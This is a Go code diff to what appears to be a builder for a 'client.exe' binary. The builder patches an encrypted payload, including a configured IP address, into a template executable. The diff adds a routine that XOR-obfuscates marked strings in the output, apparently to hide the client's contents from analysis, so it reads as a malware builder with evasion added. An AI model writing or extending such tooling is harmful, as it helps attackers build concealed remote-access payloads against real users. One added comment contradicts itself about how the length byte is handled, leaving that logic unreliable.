@@ -18,6 +18,9 @@ const (
 )
 
 var marker = []byte{0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC}
+var xorMarker = []byte{0xFE, 0xED, 0xFA, 0xCE}
+var xorProcessedMarker = []byte{0xCE, 0xFA, 0xED, 0xFE}
+const xorKey = 0xAB
 
 type Config struct {
 	IP   string `json:"ip"`
@@ -124,12 +127,62 @@ func main() {
 	copy(patchedData, data)
 	copy(patchedData[targetIndex+len(marker):], finalPayload)
 
+	// Obfuscate strings
+	patchedData = obfuscateStrings(patchedData)
+
 	err = ioutil.WriteFile("client.exe", patchedData, 0755)
 	if err != nil {
 		log.Fatalf("[-] Error writing client.exe: %v", err)
 	}
 
 	fmt.Println("[+] Successfully built client.exe")
+}
+
+func obfuscateStrings(data []byte) []byte {
+	count := 0
+	offset := 0
+	for {
+		idx := bytes.Index(data[offset:], xorMarker)
+		if idx == -1 {
+			break
+		}
+		targetIdx := offset + idx
+
+		// Found a string to obfuscate
+		// 1. Replace marker with processed marker
+		copy(data[targetIdx:], xorProcessedMarker)
+
+		// 2. Determine length and XOR the following string
+		// Original structure: MARKER(4) + \x00(1) + PAYLOAD
+		strStart := targetIdx + 5
+		strEnd := strStart
+		for strEnd < len(data) && data[strEnd] != 0 {
+			strEnd++
+		}
+
+		length := strEnd - strStart
+		if length > 255 {
+			length = 255
+		}
+
+		// 3. Store length in the byte immediately following the processed marker
+		// data[targetIdx+4] is currently \x00
+		data[targetIdx+4] = byte(length)
+
+		for i := strStart; i < strEnd; i++ {
+			data[i] = data[i] ^ xorKey
+		}
+		// Note: the very first byte of the original string (at strStart) is now the length byte.
+		// So we must have decrypted it too? No, the length byte is NOT XORed.
+		// Let's adjust the client to match this: marker(4) + length(1) + payload
+
+		count++
+		offset = strEnd
+	}
+	if count > 0 {
+		fmt.Printf("[+] Obfuscated %d strings in binary\n", count)
+	}
+	return data
 }
 
 func encrypt(plaintext []byte) []byte {
